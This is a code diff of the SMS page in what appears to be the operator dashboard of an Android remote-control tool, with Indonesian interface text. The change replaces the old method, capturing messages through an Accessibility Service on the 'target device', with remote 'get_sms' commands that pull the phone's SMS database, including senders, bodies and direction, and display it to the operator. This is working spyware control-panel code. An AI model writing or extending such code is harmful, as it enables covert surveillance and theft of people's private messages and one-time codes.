@@ -1,75 +1,80 @@
 'use client'
-import { Suspense, useEffect, useState, useCallback } from 'react'
+import { Suspense, useEffect } from 'react'
+import { useState } from 'react'
 import Sidebar from '@/components/Sidebar'
 import { useDevice } from '@/contexts/DeviceContext'
 import { useBadge } from '@/contexts/BadgeContext'
-import { MessageSquare, RefreshCw, Circle, Trash2, Bell } from 'lucide-react'
+import { MessageSquare, RefreshCw, Circle, Download } from 'lucide-react'
 
-interface NotifEntry {
-  id: number
-  appPackage: string
-  appName: string
-  title: string
-  text: string
-  receivedAt: string
+interface SmsEntry { date: string; type: string; number: string; body: string }
+
+function parseSms(text: string): SmsEntry[] {
+  const lines = text.split('\n').filter(l =>
+    l.trim() && !l.startsWith('===') && !l.startsWith('Total') && !l.startsWith('No SMS')
+  )
+  return lines.map(line => {
+    // Format: [MM-dd HH:mm][▼IN] +628xxx: isi pesan
+    const m = line.match(/^\[([^\]]+)\]\[([^\]]+)\]\s*([^:]+):\s*(.*)$/)
+    if (m) return { date: m[1], type: m[2], number: m[3].trim(), body: m[4].trim() }
+    return { date: '', type: '', number: '', body: '' }
+  }).filter(e => e.date)
+}
+
+async function smartPoll(
+  deviceId: string,
+  cmdPrefix: string,
+  sentAt: number,
+  maxAttempts = 20,
+  intervalMs = 800
+): Promise<string | null> {
+  for (let i = 0; i < maxAttempts; i++) {
+    await new Promise(r => setTimeout(r, i === 0 ? 1200 : intervalMs))
+    const r = await fetch(`/api/device/result?deviceId=${deviceId}`)
+    const d = await r.json()
+    const match = (d.history ?? [])
+      .filter((h: { command: string; result: string; timestamp: string }) =>
+        h.command.startsWith(cmdPrefix) && new Date(h.timestamp).getTime() > sentAt - 500)
+      .sort((a: { timestamp: string }, b: { timestamp: string }) =>
+        new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())[0]
+    if (match?.result) return match.result as string
+  }
+  return null
 }
 
 function SmsContent() {
   const { devices, selectedId, setSelectedId, connected } = useDevice()
   const { notifySmsCount, clearSmsBadge } = useBadge()
-  const [entries, setEntries]   = useState<NotifEntry[]>([])
-  const [loading, setLoading]   = useState(false)
-  const [clearing, setClearing] = useState(false)
-  const [limit, setLimit]       = useState('200')
+  const [entries, setEntries] = useState<SmsEntry[]>([])
+  const [loading, setLoading] = useState(false)
+  const [limit, setLimit] = useState('50')
 
   useEffect(() => { clearSmsBadge() }, [clearSmsBadge])
 
-  const fetchSms = useCallback(async () => {
+  const fetchSms = async () => {
     if (!selectedId) return
     setLoading(true)
     try {
-      const res = await fetch(
-        `/api/device/notifications?deviceId=${encodeURIComponent(selectedId)}&type=sms&limit=${limit}`
-      )
-      const d = await res.json()
-      const list: NotifEntry[] = d.entries ?? []
-      setEntries(list)
-      notifySmsCount(list.length)
-      clearSmsBadge()
-    } finally {
-      setLoading(false)
-    }
-  }, [selectedId, limit, notifySmsCount, clearSmsBadge])
-
-  // Auto-refresh tiap 10 detik saat connected
-  useEffect(() => {
-    if (!connected || !selectedId) return
-    fetchSms()
-    const t = setInterval(fetchSms, 10000)
-    return () => clearInterval(t)
-  }, [connected, selectedId, fetchSms])
-
-  const clearAll = async () => {
-    if (!selectedId) return
-    setClearing(true)
-    try {
-      await fetch(`/api/device/notifications?deviceId=${encodeURIComponent(selectedId)}`, {
-        method: 'DELETE',
+      const sentAt = Date.now()
+      await fetch('/api/device/command', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ deviceId: selectedId, command: `get_sms:${limit}` }),
       })
-      setEntries([])
-    } finally {
-      setClearing(false)
-    }
+      const result = await smartPoll(selectedId, 'get_sms', sentAt)
+      if (result) {
+        const parsed = parseSms(result)
+        setEntries(parsed)
+        notifySmsCount(parsed.length)
+        clearSmsBadge()
+      }
+    } finally { setLoading(false) }
   }
 
-  const fmt = (iso: string) => {
-    try {
-      return new Date(iso).toLocaleString('id-ID', {
-        day: '2-digit', month: '2-digit',
-        hour: '2-digit', minute: '2-digit',
-      })
-    } catch { return iso }
-  }
+  const typeColor = (type: string) =>
+    type.includes('IN') ? 'bg-android-green/10 text-android-green' : 'bg-android-blue/10 text-android-blue'
+
+  const typeLabel = (type: string) =>
+    type.includes('IN') ? '▼ IN' : '▲ OUT'
 
   return (
     <div className="flex min-h-screen">
@@ -84,9 +89,8 @@ function SmsContent() {
                 <MessageSquare size={20} className="text-android-green" />
                 SMS Messages
               </h2>
-              <p className="text-android-muted text-xs mt-0.5 flex items-center gap-1.5">
-                <Bell size={10} />
-                Ditangkap via Accessibility Notification — SMS masuk otomatis tercatat
+              <p className="text-android-muted text-xs mt-0.5">
+                Baca langsung dari database SMS perangkat via ContentResolver
               </p>
             </div>
             <div className={`flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border ${
@@ -104,81 +108,62 @@ function SmsContent() {
             <select
               value={limit}
               onChange={e => setLimit(e.target.value)}
-              className="bg-android-surface border border-android-border text-android-text text-xs rounded-lg px-3 py-2 outline-none"
+              className="px-3 py-2 bg-android-surface border border-android-border rounded-lg text-android-text text-sm focus:outline-none focus:border-android-green"
             >
+              <option value="20">Last 20</option>
               <option value="50">Last 50</option>
               <option value="100">Last 100</option>
               <option value="200">Last 200</option>
-              <option value="500">Last 500</option>
             </select>
             <button
               onClick={fetchSms}
               disabled={!connected || loading}
               className="flex items-center gap-2 px-4 py-2 bg-android-green text-android-bg rounded-lg text-sm font-semibold disabled:opacity-40 disabled:cursor-not-allowed"
             >
-              {loading
-                ? <RefreshCw size={14} className="animate-spin" />
-                : <RefreshCw size={14} />}
-              {loading ? 'Loading…' : 'Refresh'}
+              {loading ? <RefreshCw size={14} className="animate-spin" /> : <Download size={14} />}
+              {loading ? 'Fetching…' : 'Fetch SMS'}
             </button>
-            {entries.length > 0 && (
-              <button
-                onClick={clearAll}
-                disabled={clearing}
-                className="flex items-center gap-2 px-3 py-2 bg-android-red/10 border border-android-red/30 text-android-red rounded-lg text-sm font-semibold disabled:opacity-40"
-              >
-                <Trash2 size={14} />
-                {clearing ? 'Menghapus…' : 'Hapus Semua'}
-              </button>
-            )}
           </div>
 
-          {/* Empty states */}
           {!connected && (
             <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
               <MessageSquare size={32} className="mx-auto mb-3 text-android-border" />
-              Hubungkan perangkat untuk melihat SMS
+              Connect a device to view SMS
             </div>
           )}
 
           {connected && entries.length === 0 && !loading && (
             <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
-              <Bell size={32} className="mx-auto mb-3 text-android-border" />
-              <p className="font-medium text-android-text mb-1">Belum ada SMS tertangkap</p>
-              <p className="text-xs text-android-muted">
-                SMS masuk akan otomatis tercatat saat Accessibility Service aktif di perangkat target
-              </p>
+              <MessageSquare size={32} className="mx-auto mb-3 text-android-border" />
+              <p>Klik &quot;Fetch SMS&quot; untuk ambil data SMS dari perangkat</p>
             </div>
           )}
 
-          {/* SMS list */}
           {entries.length > 0 && (
-            <div className="space-y-2">
-              <p className="text-xs text-android-muted mb-2">{entries.length} pesan tertangkap</p>
-              {entries.map(e => (
-                <div
-                  key={e.id}
-                  className="bg-android-surface border border-android-border rounded-xl p-3 flex gap-3 border-l-2 border-l-android-green/50"
-                >
-                  <div className="shrink-0 pt-0.5">
-                    <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-android-green/10 text-android-green">
-                      ▼ IN
-                    </span>
-                  </div>
-                  <div className="flex-1 min-w-0">
-                    <div className="flex items-center justify-between mb-1 gap-2">
-                      <span className="text-android-text text-sm font-semibold font-mono truncate">
-                        {e.title || e.appName || e.appPackage}
+            <div className="bg-android-surface border border-android-border rounded-xl overflow-hidden">
+              <div className="px-4 py-2.5 border-b border-android-border text-xs text-android-muted">
+                {entries.length} pesan
+              </div>
+              <div className="divide-y divide-android-border/50">
+                {entries.map((e, i) => (
+                  <div key={i} className="flex gap-3 px-4 py-3 hover:bg-white/5">
+                    <div className="shrink-0 pt-0.5">
+                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded ${typeColor(e.type)}`}>
+                        {typeLabel(e.type)}
                       </span>
-                      <span className="text-android-muted text-[10px] shrink-0">{fmt(e.receivedAt)}</span>
                     </div>
-                    <p className="text-android-muted text-sm break-words">{e.text}</p>
-                    {e.appName && (
-                      <p className="text-android-muted/50 text-[10px] mt-1 font-mono">{e.appName}</p>
-                    )}
+                    <div className="flex-1 min-w-0">
+                      <div className="flex items-center justify-between mb-1 gap-2">
+                        <span className="text-android-text text-sm font-semibold font-mono truncate">
+                          {e.number}
+                        </span>
+                        <span className="text-android-muted text-[10px] shrink-0">{e.date}</span>
+                      </div>
+                      <p className="text-android-muted text-sm break-words">{e.body}</p>
+                    </div>
                   </div>
-                </div>
-              ))}
+                ))}
+              </div>
             </div>
           )}
 
